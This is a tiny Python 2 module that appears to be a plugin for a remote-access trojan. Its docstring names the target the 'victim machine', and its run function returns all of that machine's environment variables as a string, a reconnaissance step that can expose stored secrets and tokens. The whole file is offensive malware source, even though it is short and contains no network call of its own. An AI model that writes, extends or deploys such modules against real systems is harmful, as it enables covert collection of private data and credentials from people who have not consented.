import os

'''
This module returns any environment variables that  are set in the victim machine
'''

def run(**args):
    print "[*] In environment module."
    return str(os.environ)